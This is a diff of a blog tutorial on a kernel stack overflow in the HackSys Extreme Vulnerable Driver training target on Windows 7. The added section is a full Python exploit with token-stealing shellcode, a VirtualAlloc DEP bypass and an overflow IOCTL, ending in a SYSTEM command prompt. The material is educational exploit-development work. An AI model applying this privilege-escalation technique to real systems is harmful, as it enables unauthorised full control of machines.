@@ -201,7 +201,7 @@ Knowing the offset needed to control EIP, we can move on to the final exploit co
 
 ### <span class="myheader">Exploit</span>
 
-The HackSysTeam published sample token stealing payload that we can use for our needs [^3]:
+The HackSysTeam published sample token stealing payload that we can use for our needs[^3]:
 
 ```c++
 pushad                               ; Save registers state
@@ -268,8 +268,8 @@ shellcode = (
 )
 ```
 
-One last thing to take care of is the Data Execution Prevention [^4] security mechanism that would block our shellcode if we run it directly from the stack.
-To bypass that, we could use e.g. VirtualAlloc function [^5] that will allocate an executable piece of memory for us:
+One last thing to take care of is the Data Execution Prevention[^4] security mechanism that would block our shellcode if we run it directly from the stack.
+To bypass that, we could use e.g. VirtualAlloc function**[^5]** that will allocate an executable piece of memory for us:
 
 ```c++
 # Bypass DEP and allocate executable memory for shellcode
@@ -287,6 +287,98 @@ kernel32.RtlMoveMemory(
     c_int(len(shellcode))       # Length
 )
 ```
+
+We are ready now to build the final shellcode, which looks like this:
+
+```c++
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+
+kernel32 = windll.kernel32
+
+# open handle to the device
+hevd = kernel32.CreateFileW(
+    "\\\\.\\HackSysExtremeVulnerableDriver",    # file name
+    0xC0000000,     # access: GENERIC READ | GENERIC WRITE, bits 30 and 31 are set
+    0,                                          
+    None,
+    0x3,            # action to take on a device: OPEN EXISTING 
+    0,
+    None
+)
+    
+if (not hevd) or (hevd == -1):
+    print("[-] Failed to retrieve handle: " + str(GetLastError()))
+    sys.exit(1)
+
+
+shellcode = (
+    b"\x60"                            # pushad
+    b"\x31\xc0"                        # xor eax,eax
+    b"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
+
+    b"\x8b\x40\x50"                    # mov eax,[eax+0x50]
+
+    b"\x89\xc1"                        # mov ecx,eax
+
+    b"\xba\x04\x00\x00\x00"            # mov edx,0x4
+
+    b"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
+    b"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
+    b"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
+    b"\x75\xed"                        # jnz 0x1a
+    
+    b"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8] Get SYSTEM process nt!_EPROCESS.Token
+    b"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
+
+    b"\x61"                            # popad  Restore registers state
+
+    b"\x31\xc0"                        # xor eax,eax
+    b"\x5d"                            # pop ebp
+    b"\xc2\x08\x00"                    # ret 0x8
+)
+
+
+# Bypass DEP and allocate executable memory for shellcode
+va_ptr = kernel32.VirtualAlloc(
+    c_int(0),                   # lpAddress
+    c_int(len(shellcode)),      # dwSize
+    c_int(0x3000),              # flAllocationType (MEM_COMMIT | MEM_RESERVE)
+    c_int(0x40))                # flProtect (PAGE_EXECUTE_READWRITE)
+
+
+# Move shellcode to the allocated memory
+kernel32.RtlMoveMemory(
+    c_int(va_ptr),              # Destination
+    shellcode,                  # Source
+    c_int(len(shellcode))       # Length
+)
+
+payload = struct.pack("<L", va_ptr)
+
+# evil buffer
+buf = b"A"*2080 + payload
+buf_size = len(buf)
+
+# send message to the device
+kernel32.DeviceIoControl(
+    hevd,               # device handle
+    0x222003,           # IOCTL
+    buf,            
+    buf_size,       
+    None,
+    0,
+    byref(c_ulong()),
+    None
+)
+
+Popen("start cmd", shell=True)
+```
+
+After execution, we get the Command Line as NT Authority\SYSTEM user:
+
+![Command Line as SYSTEM](/assets/img/win7_shell.png)
 
 
 ## <span class="myheader">References<span>
